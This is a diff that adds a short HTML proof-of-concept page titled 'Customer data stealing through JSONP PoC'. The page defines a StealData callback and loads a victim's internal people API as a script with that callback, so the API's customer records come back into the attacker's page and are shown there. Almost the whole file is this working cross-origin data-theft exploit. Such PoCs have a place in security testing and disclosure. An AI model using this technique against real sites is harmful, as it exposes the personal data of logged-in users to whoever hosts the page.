@@ -1,0 +1,20 @@
+<html>
+
+<html>
+    <head>        
+    </head>
+<body>        
+    <h1>Customer data stealing through JSONP PoC</h1>
+    <div id="dataHolder"></div>
+</body>
+<script>
+    StealData = function(jsonData)
+    {            
+        myData = jsonData;
+        var jsonData = JSON.stringify(myData);
+        var elem = document.getElementById("dataHolder");
+        elem.innerText = jsonData;                   
+    }
+    </script>
+<script src=https://victim.internal/api/v1/people?callback=StealData></script>
+</html>
